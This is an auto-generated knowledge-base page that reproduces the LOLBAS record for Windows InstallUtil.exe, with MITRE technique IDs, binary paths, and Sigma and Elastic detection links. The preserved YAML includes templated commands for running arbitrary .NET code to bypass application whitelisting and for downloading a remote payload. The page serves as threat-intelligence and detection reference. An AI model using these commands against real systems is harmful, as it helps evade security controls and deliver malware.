---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Installutil.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `installutil.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Installutil.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Installutil.exe](../../tools/windows/installutil.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | installutil.exe |
| name | Installutil.exe |
| type | tool |
| source | lolbas |
| url | https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
- Handle: '@C_h4ck_0'
  Person: Nir Chako (Pentera)
Author: Oddvar Moe
Commands:
- Category: AWL Bypass
  Command: InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
  Description: Execute the target .NET DLL or EXE.
  MitreID: T1218.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: DLL (.NET)
  - Execute: EXE (.NET)
  Usecase: Use to execute code and bypass application whitelisting
- Category: Execute
  Command: InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
  Description: Execute the target .NET DLL or EXE.
  MitreID: T1218.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: DLL (.NET)
  - Execute: EXE (.NET)
  Usecase: Use to execute code and bypass application whitelisting
- Category: Download
  Command: InstallUtil.exe {REMOTEURL}
  Description: It will download a remote payload and place it in INetCache.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Downloads payload from remote server
Created: 2018-05-25
Description: The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing
  the installer components in specified assemblies
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_installutil_download.yml
- Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
Full_Path:
- Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe
- Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
Name: Installutil.exe
Resources:
- Link: https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
- Link: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12
- Link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md
- Link: https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/
- Link: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
- Link: https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Installutil.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_installutil_download.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_installutil_download.yml
- Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
```
